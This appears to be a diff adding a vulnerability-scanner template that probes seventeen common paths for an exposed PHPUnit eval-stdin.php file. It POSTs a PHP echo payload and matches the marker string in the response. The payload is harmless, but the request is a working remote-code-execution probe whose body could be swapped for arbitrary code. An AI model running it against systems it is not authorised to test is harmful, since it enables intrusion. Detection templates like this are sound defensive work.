@@ -1,0 +1,42 @@
+id: phpunit-eval-stdin-rce
+
+info:
+  name: PHPUnit eval-stdin.php RCE
+  author: MadExploits
+  severity: critical
+  description: Detects exposed PHPUnit eval-stdin.php file allowing remote code execution.
+  reference:
+    - https://github.com/sektioneins/pcc
+    - https://github.com/FriendsOfPHP/security-advisories/blob/master/phpunit/phpunit/2017-09-15.yaml
+  tags: php,phpunit,rce,fileupload
+
+requests:
+  - method: POST
+    path:
+      - "{{BaseURL}}/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/assets/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/asset/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/dist/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/plugin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/dashboard/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+      - "{{BaseURL}}/administrator/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"
+    headers:
+      User-Agent: "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko"
+      Content-Type: application/x-www-form-urlencoded
+    body: "<?='MrMad';?>"
+
+    matchers:
+      - type: word
+        words:
+          - "MrMad"
+        part: body
